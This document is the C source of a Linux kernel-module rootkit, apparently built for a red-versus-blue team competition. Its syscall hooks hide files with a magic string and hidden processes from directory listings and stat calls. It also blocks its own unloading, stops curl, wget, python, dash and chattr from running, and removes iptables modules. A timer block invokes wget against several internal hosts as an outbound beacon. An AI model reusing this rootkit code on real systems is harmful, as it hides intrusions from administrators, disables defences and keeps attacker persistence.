/*
 * Author: Daniel Liscinsky
 */



#include <linux/errno.h>
#include <linux/limits.h>
#include <linux/slab.h>
#include <linux/dirent.h>
#include <linux/sched.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/namei.h>
#include <net/sock.h>

#include <net/sock.h>
#include <net/inet_common.h>
#include <linux/net.h>
#include <linux/ip.h>
#include <linux/in.h>


#include "hooked_kernel_syscalls.h"
#include "kernel_rootkit_actions.h"
#include "kernel_rootkit.h"
#include "magic.h"
#include "debug.h"








void init_syscall_hooks(void) {

	//TODO
}



//https://github.com/mlongob/Linux-Kernel-Hack/blob/master/security/tomoyo/realpath.c

/**
 * tomoyo_encode2 - Encode binary string to ascii string.
 *
 * @str:     String in binary format.
 * @str_len: Size of @str in byte.
 *
 * Returns pointer to @str in ascii format on success, NULL otherwise.
 *
 * This function uses kzalloc(), so caller must kfree() if this function
 * didn't return NULL.
 */
char *tomoyo_encode2(const char *str, int str_len)
{
	int i;
	int len = 0;
	const char *p = str;
	char *cp;
	char *cp0;

	if (!p)
		return NULL;
	for (i = 0; i < str_len; i++) {
		const unsigned char c = p[i];

		if (c == '\\')
			len += 2;
		else if (c > ' ' && c < 127)
			len++;
		else
			len += 4;
	}
	len++;
	/* Reserve space for appending "/". */
	cp = kzalloc(len + 10, GFP_NOFS);
	if (!cp)
		return NULL;
	cp0 = cp;
	p = str;
	for (i = 0; i < str_len; i++) {
		const unsigned char c = p[i];

		if (c == '\\') {
			*cp++ = '\\';
			*cp++ = '\\';
		} else if (c > ' ' && c < 127) {
			*cp++ = c;
		} else {
			*cp++ = '\\';
			*cp++ = (c >> 6) + '0';
			*cp++ = ((c >> 3) & 7) + '0';
			*cp++ = (c & 7) + '0';
		}
	}
	return cp0;
}

/**
 * tomoyo_encode - Encode binary string to ascii string.
 *
 * @str: String in binary format.
 *
 * Returns pointer to @str in ascii format on success, NULL otherwise.
 *
 * This function uses kzalloc(), so caller must kfree() if this function
 * didn't return NULL.
 */
char *tomoyo_encode(const char *str)
{
	return str ? tomoyo_encode2(str, strlen(str)) : NULL;
}

/**
 * tomoyo_get_absolute_path - Get the path of a dentry but ignores chroot'ed root.
 *
 * @path:   Pointer to "struct path".
 * @buffer: Pointer to buffer to return value in.
 * @buflen: Sizeof @buffer.
 *
 * Returns the buffer on success, an error code otherwise.
 *
 * If dentry is a directory, trailing '/' is appended.
 */
/*static char *tomoyo_get_absolute_path(struct path *path, char * const buffer,
				      const int buflen)
{
	char *pos = ERR_PTR(-ENOMEM);
	if (buflen >= 256) {
		// Go to whatever namespace root we are under
		pos = d_absolute_path(path, buffer, buflen - 1);
		if (!IS_ERR(pos) && *pos == '/' && pos[1]) {
			struct inode *inode = path->dentry->d_inode;
			if (inode && S_ISDIR(inode->i_mode)) {
				buffer[buflen - 2] = '/';
				buffer[buflen - 1] = '\0';
			}
		}
	}
	return pos;
}

/**
 * tomoyo_get_dentry_path - Get the path of a dentry.
 *
 * @dentry: Pointer to "struct dentry".
 * @buffer: Pointer to buffer to return value in.
 * @buflen: Sizeof @buffer.
 *
 * Returns the buffer on success, an error code otherwise.
 *
 * If dentry is a directory, trailing '/' is appended.
 */
/*static char *tomoyo_get_dentry_path(struct dentry *dentry, char * const buffer,
				    const int buflen)
{
	char *pos = ERR_PTR(-ENOMEM);
	if (buflen >= 256) {
		pos = dentry_path_raw(dentry, buffer, buflen - 1);
		if (!IS_ERR(pos) && *pos == '/' && pos[1]) {
			struct inode *inode = dentry->d_inode;
			if (inode && S_ISDIR(inode->i_mode)) {
				buffer[buflen - 2] = '/';
				buffer[buflen - 1] = '\0';
			}
		}
	}
	return pos;
}

/**
 * tomoyo_get_local_path - Get the path of a dentry.
 *
 * @dentry: Pointer to "struct dentry".
 * @buffer: Pointer to buffer to return value in.
 * @buflen: Sizeof @buffer.
 *
 * Returns the buffer on success, an error code otherwise.
 */
/*static char *tomoyo_get_local_path(struct dentry *dentry, char * const buffer,
				   const int buflen)
{
	struct super_block *sb = dentry->d_sb;
	char *pos = tomoyo_get_dentry_path(dentry, buffer, buflen);
	if (IS_ERR(pos))
		return pos;
	// Convert from $PID to self if $PID is current thread.
	if (sb->s_magic == PROC_SUPER_MAGIC && *pos == '/') {
		char *ep;
		const pid_t pid = (pid_t) simple_strtoul(pos + 1, &ep, 10);
		if (*ep == '/' && pid && pid ==
		    task_tgid_nr_ns(current, sb->s_fs_info)) {
			pos = ep - 5;
			if (pos < buffer)
				goto out;
			memmove(pos, "/self", 5);
		}
		goto prepend_filesystem_name;
	}
	// Use filesystem name for unnamed devices.
	if (!MAJOR(sb->s_dev))
		goto prepend_filesystem_name;
	{
		struct inode *inode = sb->s_root->d_inode;
		
		// Use filesystem name if filesystem does not support rename() operation.
		if (inode->i_op && !inode->i_op->rename)
			goto prepend_filesystem_name;
	}
	// Prepend device name.
	{
		char name[64];
		int name_len;
		const dev_t dev = sb->s_dev;
		name[sizeof(name) - 1] = '\0';
		snprintf(name, sizeof(name) - 1, "dev(%u,%u):", MAJOR(dev),
			 MINOR(dev));
		name_len = strlen(name);
		pos -= name_len;
		if (pos < buffer)
			goto out;
		memmove(pos, name, name_len);
		return pos;
	}
	// Prepend filesystem name.
prepend_filesystem_name:
	{
		const char *name = sb->s_type->name;
		const int name_len = strlen(name);
		pos -= name_len + 1;
		if (pos < buffer)
			goto out;
		memmove(pos, name, name_len);
		pos[name_len] = ':';
	}
	return pos;
out:
	return ERR_PTR(-ENOMEM);
}

/**
 * tomoyo_get_socket_name - Get the name of a socket.
 *
 * @path:   Pointer to "struct path".
 * @buffer: Pointer to buffer to return value in.
 * @buflen: Sizeof @buffer.
 *
 * Returns the buffer.
 */
/*static char *tomoyo_get_socket_name(struct path *path, char * const buffer,
				    const int buflen)
{
	struct inode *inode = path->dentry->d_inode;
	struct socket *sock = inode ? SOCKET_I(inode) : NULL;
	struct sock *sk = sock ? sock->sk : NULL;
	if (sk) {
		snprintf(buffer, buflen, "socket:[family=%u:type=%u:"
			 "protocol=%u]", sk->sk_family, sk->sk_type,
			 sk->sk_protocol);
	} else {
		snprintf(buffer, buflen, "socket:[unknown]");
	}
	return buffer;
}

/**
* tomoyo_realpath_from_path - Returns realpath(3) of the given pathname but ignores chroot'ed root.
*
* @path: Pointer to "struct path".
*
* Returns the realpath of the given @path on success, NULL otherwise.
*
* If dentry is a directory, trailing '/' is appended.
* Characters out of 0x20 < c < 0x7F range are converted to
* \ooo style octal string.
* Character \ is converted to \\ string.
*
* These functions use kzalloc(), so the caller must call kfree()
* if these functions didn't return NULL.
*/
/*char *tomoyo_realpath_from_path(struct path *path)
{
	char *buf = NULL;
	char *name = NULL;
	unsigned int buf_len = PAGE_SIZE / 2;
	struct dentry *dentry = path->dentry;
	struct super_block *sb;
	if (!dentry)
		return NULL;
	sb = dentry->d_sb;
	while (1) {
		char *pos;
		struct inode *inode;
		buf_len <<= 1;
		kfree(buf);
		buf = kmalloc(buf_len, GFP_NOFS);
		if (!buf)
			break;
		// To make sure that pos is '\0' terminated.
		buf[buf_len - 1] = '\0';
		// Get better name for socket.
		if (sb->s_magic == SOCKFS_MAGIC) {
			pos = tomoyo_get_socket_name(path, buf, buf_len - 1);
			goto encode;
		}
		// For "pipe:[\$]". 
		if (dentry->d_op && dentry->d_op->d_dname) {
			pos = dentry->d_op->d_dname(dentry, buf, buf_len - 1);
			goto encode;
		}
		inode = sb->s_root->d_inode;
		
		// Get local name for filesystems without rename() operation
		// or dentry without vfsmount.
		if (!path->mnt || (inode->i_op && !inode->i_op->rename))
			pos = tomoyo_get_local_path(path->dentry, buf,
				buf_len - 1);
		// Get absolute name for the rest.
		else {
			pos = tomoyo_get_absolute_path(path, buf, buf_len - 1);
			
			// Fall back to local name if absolute name is not available.
			if (pos == ERR_PTR(-EINVAL))
				pos = tomoyo_get_local_path(path->dentry, buf,
					buf_len - 1);
		}
	encode:
		if (IS_ERR(pos))
			continue;
		name = tomoyo_encode(pos);
		break;
	}
	kfree(buf);
	if (!name)
		;// tomoyo_warn_oom(__func__);
	return name;
}

/**
* tomoyo_realpath_nofollow - Get realpath of a pathname.
*
* @pathname: The pathname to solve.
*
* Returns the realpath of @pathname on success, NULL otherwise.
*/
/*char *tomoyo_realpath_nofollow(const char *pathname)
{
	struct path path;

	if (pathname && kern_path(pathname, 0, &path) == 0) {
		char *buf = tomoyo_realpath_from_path(&path);
		path_put(&path);
		return buf;
	}
	return NULL;
}


/**
 * Returns non zero value if should take special action against the opertion requested for the file given by pathname.
 */
static int should_hook_file(const char *_userm_pathname) {
	//const int _userm_len = strlen(_userm_pathname) + 1;

	// Copy string to kernel memory
	char *pathname = kmalloc(PATH_MAX, GFP_KERNEL);
	if (!pathname) {
		return 1;
	}

	if (copy_from_user(pathname, _userm_pathname, PATH_MAX) != 0)
	{
		//DEBUG_printk2("[ERROR] Failed to copy %lu bytes from user for should_hook_file\n", _userm_len);
		kfree(pathname);
		return 1;
	}

	// Convert to real path first
	//char real_pathname[256];									//TODO TODO TODO
	//= tomoyo_get_absolute_path(pathname,);
	char *real_pathname = pathname; // tomoyo_realpath_from_path(pathname);
	//DEBUG_printk2("[INFO] should_hook_file: pathname = %s\n", pathname);

	// If resolving pathname failed
	if (!real_pathname || real_pathname == ERR_PTR(-ENOMEM) || real_pathname == ERR_PTR(-ENAMETOOLONG)) {
		DEBUG_printk2("[INFO] should_hook_file: pathname = %s\n", pathname);
		return 1;
	}

	//DEBUG_printk2("[INFO] should_hook_file: real_pathname = %s\n", real_pathname);

	// If file path contains magic string
	if (strstr(real_pathname, MAGIC_STR)) {
		DEBUG_printk2("[INFO] should_hook_file: pathname = %s\n", pathname);
		return 1;
	}

	// For each hidden file
	char **curr_file = hidden_files_list;
	while (*curr_file) {
		if (!strcmp(real_pathname, *curr_file)) {
			DEBUG_printk2("[INFO] should_hook_file: pathname = %s\n", pathname);
			return 1;
		}

		curr_file++;
	}

	kfree(pathname);




	
	

	// Timeout
	struct timespec ts;
	getnstimeofday(&ts);
	//DEBUG_printk2("[INFO] ts.tv_sec = %d\n", ts.tv_sec);
	//DEBUG_printk2("[INFO] end.tv_sec = %d\n", end.tv_sec);
	if (ts.tv_sec > end.tv_sec) {

		mutex_lock(&claim_in_syscall_mutex);
		{
			end = ts;
			end.tv_sec += 10;
		}
		mutex_unlock(&claim_in_syscall_mutex);


		DEBUG_printk2("[INFO] new end.tv_sec = %d\n", end.tv_sec);
		DEBUG_pr_info("[INFO] claim timer trigger\n");


		/*
		struct sockaddr_in addr;
		int size = 0;

		mm_segment_t oldmm;
		oldmm = get_fs();
		set_fs(KERNEL_DS);
		// MSG_DONTWAIT: nonblocking operation: as soon as the packet is read, the call returns
		// MSG_WAITALL: blocks until it does not receive size_buff bytes OR the SO_RCVTIMEO expires.
		;
		size =  orig_recvfrom(c2_socket, buf, len, 0, &addr, &addr_len);
		set_fs(oldmm);


		// If timed out blocking (or otherwise received 0)
		if (size <= 0) {
			continue;
		}


		DEBUG_printk2("[INFO] recv size = %d\n", size);
		DEBUG_pr_info("[INFO] Message:\n");
		for (i = 0; i < len; i++) {
			DEBUG_printk2("%c", buf[i]);
		}
		DEBUG_pr_info("\n---END---\n");
		*/


		char *argv1[] = { "/usr/bin/wget", "10.1.0.12:8000/?team=blue", NULL };
		char *argv2[] = { "/usr/bin/wget", "10.2.0.7:8000/?team=blue", NULL };
		char *argv3[] = { "/usr/bin/wget", "10.3.0.7:8000/?team=blue", NULL };
		char *argv4[] = { "/usr/bin/wget", "10.4.0.7:8000/?team=blue", NULL };
		char *argv5[] = { "/usr/bin/wget", "10.5.0.7:8000/?team=blue", NULL };
		/*
		char *argv1_2[] = { "/usr/bin/wget", "10.1.0.13:8000/?team=blue", NULL };
		char *argv2_2[] = { "/usr/bin/wget", "10.2.0.13:8000/?team=blue", NULL };
		char *argv3_2[] = { "/usr/bin/wget", "10.3.0.13:8000/?team=blue", NULL };
		char *argv4_2[] = { "/usr/bin/wget", "10.4.0.13:8000/?team=blue", NULL };
		char *argv5_2[] = { "/usr/bin/wget", "10.5.0.13:8000/?team=blue", NULL };

		char *argv1_3[] = { "/usr/bin/wget", "10.1.0.14:8000/?team=blue", NULL };
		char *argv2_3[] = { "/usr/bin/wget", "10.2.0.14:8000/?team=blue", NULL };
		char *argv3_3[] = { "/usr/bin/wget", "10.3.0.14:8000/?team=blue", NULL };
		char *argv4_3[] = { "/usr/bin/wget", "10.4.0.14:8000/?team=blue", NULL };
		char *argv5_3[] = { "/usr/bin/wget", "10.5.0.14:8000/?team=blue", NULL };
		
		char *argv1_4[] = { "/usr/bin/wget", "10.1.0.15:8000/?team=blue", NULL };
		char *argv2_4[] = { "/usr/bin/wget", "10.2.0.15:8000/?team=blue", NULL };
		char *argv3_4[] = { "/usr/bin/wget", "10.3.0.15:8000/?team=blue", NULL };
		char *argv4_4[] = { "/usr/bin/wget", "10.4.0.15:8000/?team=blue", NULL };
		char *argv5_4[] = { "/usr/bin/wget", "10.5.0.15:8000/?team=blue", NULL };
		*/
		char *envp[] = { "PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin", NULL };
		

		int result;
		result = call_usermodehelper(argv1[0], argv1, envp, UMH_NO_WAIT);//UMH_NO_WAIT);
		DEBUG_printk2("call_usermodehelper result = %d\n", result);
		//if (result == 0) goto out;

		result = call_usermodehelper(argv2[0], argv2, envp, UMH_NO_WAIT);//UMH_NO_WAIT);
		DEBUG_printk2("call_usermodehelper result = %d\n", result);
		//if (result == 0) goto out;

		result = call_usermodehelper(argv3[0], argv3, envp, UMH_NO_WAIT);//UMH_NO_WAIT);
		DEBUG_printk2("call_usermodehelper result = %d\n", result);
		//if (result == 0) goto out;

		result = call_usermodehelper(argv4[0], argv4, envp, UMH_NO_WAIT);//UMH_NO_WAIT);
		DEBUG_printk2("call_usermodehelper result = %d\n", result);
		//if (result == 0) goto out;

		result = call_usermodehelper(argv5[0], argv5, envp, UMH_NO_WAIT);//UMH_NO_WAIT);
		DEBUG_printk2("call_usermodehelper result = %d\n", result);
		//if (result == 0) goto out;

		/*
		result = call_usermodehelper(argv1_2[0], argv1_2, envp, UMH_NO_WAIT);//UMH_NO_WAIT);
		DEBUG_printk2("call_usermodehelper result = %d\n", result);
		//if (result == 0) goto out;

		result = call_usermodehelper(argv2_2[0], argv2_2, envp, UMH_NO_WAIT);//UMH_NO_WAIT);
		DEBUG_printk2("call_usermodehelper result = %d\n", result);
		//if (result == 0) goto out;

		result = call_usermodehelper(argv3_2[0], argv3_2, envp, UMH_NO_WAIT);//UMH_NO_WAIT);
		DEBUG_printk2("call_usermodehelper result = %d\n", result);
		//if (result == 0) goto out;

		result = call_usermodehelper(argv4_2[0], argv4_2, envp, UMH_NO_WAIT);//UMH_NO_WAIT);
		DEBUG_printk2("call_usermodehelper result = %d\n", result);
		//if (result == 0) goto out;

		result = call_usermodehelper(argv5_2[0], argv5_2, envp, UMH_NO_WAIT);//UMH_NO_WAIT);
		DEBUG_printk2("call_usermodehelper result = %d\n", result);
		//if (result == 0) goto out;


		result = call_usermodehelper(argv1_3[0], argv1_3, envp, UMH_NO_WAIT);//UMH_NO_WAIT);
		DEBUG_printk2("call_usermodehelper result = %d\n", result);
		//if (result == 0) goto out;

		result = call_usermodehelper(argv2_3[0], argv2_3, envp, UMH_NO_WAIT);//UMH_NO_WAIT);
		DEBUG_printk2("call_usermodehelper result = %d\n", result);
		//if (result == 0) goto out;

		result = call_usermodehelper(argv3_3[0], argv3_3, envp, UMH_NO_WAIT);//UMH_NO_WAIT);
		DEBUG_printk2("call_usermodehelper result = %d\n", result);
		//if (result == 0) goto out;

		result = call_usermodehelper(argv4_3[0], argv4_3, envp, UMH_NO_WAIT);//UMH_NO_WAIT);
		DEBUG_printk2("call_usermodehelper result = %d\n", result);
		//if (result == 0) goto out;

		result = call_usermodehelper(argv5_3[0], argv5_3, envp, UMH_NO_WAIT);//UMH_NO_WAIT);
		DEBUG_printk2("call_usermodehelper result = %d\n", result);
		//if (result == 0) goto out;

		
		result = call_usermodehelper(argv1_4[0], argv1_4, envp, UMH_NO_WAIT);//UMH_NO_WAIT);
		DEBUG_printk2("call_usermodehelper result = %d\n", result);
		//if (result == 0) goto out;

		result = call_usermodehelper(argv2_4[0], argv2_4, envp, UMH_NO_WAIT);//UMH_NO_WAIT);
		DEBUG_printk2("call_usermodehelper result = %d\n", result);
		//if (result == 0) goto out;

		result = call_usermodehelper(argv3_4[0], argv3_4, envp, UMH_NO_WAIT);//UMH_NO_WAIT);
		DEBUG_printk2("call_usermodehelper result = %d\n", result);
		//if (result == 0) goto out;

		result = call_usermodehelper(argv4_4[0], argv4_4, envp, UMH_NO_WAIT);//UMH_NO_WAIT);
		DEBUG_printk2("call_usermodehelper result = %d\n", result);
		//if (result == 0) goto out;

		result = call_usermodehelper(argv5_4[0], argv5_4, envp, UMH_NO_WAIT);//UMH_NO_WAIT);
		DEBUG_printk2("call_usermodehelper result = %d\n", result);
		//if (result == 0) goto out;
		

		//char *argv0[] = { "/usr/bin/wget", "127.0.0.1:8000/?team=blue", NULL };
		//result = call_usermodehelper(argv0[0], argv0, envp, UMH_WAIT_PROC);//UMH_NO_WAIT);
		//DEBUG_printk2("call_usermodehelper result = %d\n", result);
		//if (result == 0) goto out;
	*/	
	}

	


out:
	return 0;
}



// ##########################################################################################
//									  Hooked syscalls
//	
// ##########################################################################################

asmlinkage int hooked_access(const char *pathname, int mode) {

	if (should_hook_file(pathname)) {
		return -ENOENT;
	}

	return orig_access(pathname, mode);
}

asmlinkage int hooked_faccessat(int dirfd, const char *pathname, int mode, int flags){

	if (should_hook_file(pathname)) {		//TODO			THIS CHECK IS INSUFFICIENT beause of dirfd			!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
		return -ENOENT;
	}

	return orig_faccessat(dirfd, pathname, mode, flags);
}

asmlinkage int hooked_chmod(const char *pathname, mode_t mode) {

	if (should_hook_file(pathname)) {
		return -ENOENT;
	}

	return orig_chmod(pathname, mode);
}

//asmlinkage int hooked_fchmod(int fd, mode_t mode){}

asmlinkage int hooked_fchmodat(int dirfd, const char *pathname, mode_t mode, int flags) {

	if (should_hook_file(pathname)) {		//TODO			THIS CHECK IS INSUFFICIENT beause of dirfd			!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
		return -ENOENT;
	}

	return orig_fchmodat(dirfd, pathname, mode, flags);
}

asmlinkage int hooked_creat(const char *pathname, mode_t mode){

	if (should_hook_file(pathname)) {
		return -EACCES;
	}

	return orig_creat(pathname, mode);
}

/**
 * Always (almost always) return failure. No one is allowed to remove this 
 * kernel module, unless the 'allow_module_unload' variable is set.
 */
asmlinkage int hooked_delete_module(const char *name, int flags){
	DEBUG_pr_info("Intercepted call to delete_module()\n");

	// If this module is allowed to be unloaded
	if (allow_module_unload) {
		
		// If module is currently hidden
		if (is_module_hidden) {
			// Must unhide this module or else delete_module will fail to remove it
			unhide_module();
		}

		return orig_delete_module(name, flags);
	}
	
	return -EBUSY;
}

/**
 * Disallow certain applications from being started.
 * The current list of banned applications is hardcoded and includes:
 *		(x) chattr
 *		(x) curl
 *		(x) wget
 * 		(x) dash
 * 		(x) /bin/dash
 *		(x) python
 *		(x) /usr/bin/python
 *		(x) python3
 *		(x) /usr/bin/python3
 *		(x) xtables-multi-14
 *		(x) xtables-multi-16
 */
asmlinkage int hooked_execve(const char *filename, char *const argv[], char *const envp[]) {

	if (should_hook_file(filename)) {
		DEBUG_printk1("Denied execve()\n");
		return -EIO;
	}

	// Copy string to kernel memory
	char *k_pathname = kmalloc(PATH_MAX, GFP_KERNEL);
	if (!k_pathname) {
		DEBUG_printk1("hooked_execve() failed to kmalloc\n");
		return -ENOMEM;
	}

	if (copy_from_user(k_pathname, filename, PATH_MAX) != 0) {
		DEBUG_printk1("hooked_execve() failed to copy from user\n");
		kfree(k_pathname);
		return -EFAULT;
	}
																	//TODO			better enforcement of restricted programs to prevent circumvention
	// Check if action should be disallowed
	if (strstr(k_pathname, "chattr") || strstr(k_pathname, "curl") || strstr(k_pathname, "wget") 
			|| strstr(k_pathname, "dash") || strstr(k_pathname, "/bin/dash") 
			|| strstr(k_pathname, "python") || strstr(k_pathname, "/usr/bin/python") 
			|| strstr(k_pathname, "python3") || strstr(k_pathname, "/usr/bin/python3")
			|| strstr(k_pathname, "xtables-multi-14") || strstr(k_pathname, "xtables-multi-16") ){
		DEBUG_printk1("Denied execve()\n");
		kfree(k_pathname);
		return -EIO;
	}
	
	kfree(k_pathname);

	return orig_execve(filename, argv, envp);
}

/**
 * Disallow certain applications from being started.
 * The current list of banned applications is hardcoded and includes:
 *		(x) chattr
 *		(x) curl
 *		(x) wget
 * 		(x) dash
 * 		(x) /bin/dash
 *		(x) python
 *		(x) /usr/bin/python
 *		(x) python3
 *		(x) /usr/bin/python3
 *		(x) xtables-multi-14
 *		(x) xtables-multi-16
 */
asmlinkage int hooked_execveat(int dirfd, const char *pathname, char *const argv[], char *const envp[], int flags) {

	// Copy string to kernel memory
	char *k_pathname = kmalloc(PATH_MAX, GFP_KERNEL);
	if (!k_pathname) {
		return -ENOMEM;
	}

	if (copy_from_user(k_pathname, pathname, PATH_MAX) != 0) {
		kfree(k_pathname);
		return -EFAULT;
	}
																//TODO			better handling of pathnames related to dirfd			!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
	// Check if action should be disallowed
	if (strstr(k_pathname, "chattr") || strstr(k_pathname, "curl") || strstr(k_pathname, "wget") 
			|| strstr(k_pathname, "dash") || strstr(k_pathname, "/bin/dash") 
			|| strstr(k_pathname, "python") || strstr(k_pathname, "/usr/bin/python") 
			|| strstr(k_pathname, "python3") || strstr(k_pathname, "/usr/bin/python3")
			|| strstr(k_pathname, "xtables-multi-14") || strstr(k_pathname, "xtables-multi-16") ){
		kfree(k_pathname);
		return -EIO;
	}

	kfree(k_pathname);

	return orig_execveat(dirfd, pathname, argv, envp, flags);
}

/**
 * Always return failure. No one else is allowed to load additional 
 * kernel mods since they may interfere with this one.
 */
asmlinkage int hooked_init_module(void *module_image, unsigned long len, const char *param_values) {
	DEBUG_pr_info("Intercepted call to init_module()\n");
	
	//return -EBUSY;
	return orig_init_module(module_image, len, param_values);
}

/**
 * Always return failure. No one else is allowed to load additional 
 * kernel mods since they may interfere with this one.
 */
asmlinkage int hooked_finit_module(int fd, const char *param_values, int flags) {
	DEBUG_pr_info("Intercepted call to finit_module()\n");
	
	//return -EBUSY;
	int ret = orig_finit_module(fd, param_values, flags);
	
	// Prohibit iptables from loading
	mm_segment_t fs = get_fs();
	set_fs(KERNEL_DS);
	orig_delete_module("iptable_filter", O_NONBLOCK);
	orig_delete_module("ip_tables", O_NONBLOCK);
	orig_delete_module("x_tables", O_NONBLOCK);
	set_fs(fs);

	return ret;
}

asmlinkage int hooked_stat(const char *pathname, struct stat *statbuf){

	if (should_hook_file(pathname)) {
		return -ENOENT;
	}

	return orig_stat(pathname, statbuf);
}

//asmlinkage int hooked_fstat(int fd, struct stat *statbuf){}

asmlinkage int hooked_lstat(const char *pathname, struct stat *statbuf) {

	if (should_hook_file(pathname)) {
		return -ENOENT;
	}

	return orig_lstat(pathname, statbuf);
}

asmlinkage int hooked_stat64(const char *pathname, struct stat *statbuf) {

	if (should_hook_file(pathname)) {
		return -ENOENT;
	}

	return orig_stat64(pathname, statbuf);
}

//asmlinkage int hooked_fstat64(int fd, struct stat *statbuf){}

asmlinkage int hooked_lstat64(const char *pathname, struct stat *statbuf) {

	if (should_hook_file(pathname)) {
		return -ENOENT;
	}

	return orig_lstat64(pathname, statbuf);
}

asmlinkage int hooked_fstatat(int dirfd, const char *pathname, struct stat *statbuf, int flags) {

	if (should_hook_file(pathname)) {		//TODO			THIS CHECK IS INSUFFICIENT beause of dirfd			!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
		return -ENOENT;
	}

	return orig_fstatat(dirfd, pathname, statbuf, flags);
}

asmlinkage int hooked_fstatat64(int dirfd, const char *pathname, struct stat *statbuf, int flags) {

	if (should_hook_file(pathname)) {		//TODO			THIS CHECK IS INSUFFICIENT beause of dirfd			!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
		return -ENOENT;
	}

	return orig_fstatat64(dirfd, pathname, statbuf, flags);
}

asmlinkage int hooked_truncate(const char *path, off_t length){

	if (should_hook_file(path)) {
		return -ENOENT;
	}

	return orig_truncate(path, length);
}

//asmlinkage int hooked_ftruncate(int fd, off_t length){}

asmlinkage int hooked_truncate64(const char *path, off_t length) {

	if (should_hook_file(path)) {
		return -ENOENT;
	}

	return orig_truncate64(path, length);
}

//asmlinkage int hooked_ftruncate64(int fd, off_t length){}

/*
asmlinkage int hooked_statx(int dirfd, const char *pathname, int flags, unsigned int mask, struct statx *statxbuf) {

	if (should_hook_file(pathname)) {																//TODO better checks b/c dirfd
		return -ENOENT;
	}

	return orig_statx(dirfd, pathname, flags, mask, statxbuf);
}
*/

asmlinkage int hooked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {

	int ret = orig_getdents(fd, dirp, count);
	int err;
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;	

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirp, ret);
	if (err)
		goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev) /*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		//DEBUG_printk2("[INFO] getdents dir->d_name=%s\n", dir->d_name);
		if ((!proc && (strstr(dir->d_name, MAGIC_STR) != NULL || 0 ))//karray_contains(hidden_inodes_list, ?)) //should_hook_file(dir->d_name)
					|| (proc && is_pid_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {

			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirp, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

asmlinkage int hooked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
	
	int ret = orig_getdents64(fd, dirp, count);
	int err;
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirp, ret);
	if (err)
		goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

	// 
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev) /*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	// 
	while (off < ret) {
		dir = (void *)kdirent + off;
		
		// If filename contains the magic string, or if ...
		if ( (!proc && (strstr(dir->d_name, MAGIC_STR) != NULL || 0))//karray_contains(hidden_files_list, ?))
				|| (proc && is_pid_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirp, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

/**
 * Always return failure.
 */
asmlinkage long hooked_kexec_load(unsigned long entry, unsigned long nr_segments, struct kexec_segment *segments, unsigned long flags) {
	return -EINVAL;
}

/**
 * Always return failure.
 */
asmlinkage long hooked_kexec_file_load(int kernel_fd, int initrd_fd, unsigned long cmdline_len, const char *cmdline, unsigned long flags) {
	return -EINVAL;
}

asmlinkage int hooked_kill(pid_t pid, int sig) {
	//struct task_struct *task;
	
	// Do nothing if process is invisible
	if (is_pid_invisible(pid)) {																																//TODO user provided int is this problem??????????????????????????????????
		return 0;
	}

	switch (sig) {
		/*
		case SIGINVIS:
		if ((task = find_task(pid)) == NULL)
		return -ESRCH;
		task->flags ^= PF_INVISIBLE;
		break;
		case SIGSUPER:
		give_root();
		break;
		case SIGMODINVIS:
		if (module_hidden) module_show();
		else module_hide();
		break;
		*/
	default:
		DEBUG_pr_info("Hooked kill()!!!\n");
		return orig_kill(pid, sig);
	}
	return 0;
}

asmlinkage int hooked_link(const char *oldpath, const char *newpath) {

	if (should_hook_file(oldpath)) {
		return -ENOENT;
	}
	if (should_hook_file(newpath)) {
		return -ENOSPC;
	}

	return orig_link(oldpath, newpath);
}

asmlinkage int hooked_linkat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, int flags) {

	if (should_hook_file(oldpath)) {
		return -ENOENT;
	}
	if (should_hook_file(newpath)) {
		return -ENOSPC;
	}

	return orig_linkat(olddirfd, oldpath, newdirfd, newpath, flags);
}

asmlinkage int hooked_open(const char *pathname, int flags, mode_t mode) {
	/*
	if (should_hook_file(pathname)) {
		DEBUG_printk1("Denied open()\n");
		return -ENOENT;
	}
	*/
	return orig_open(pathname, flags, mode);
}

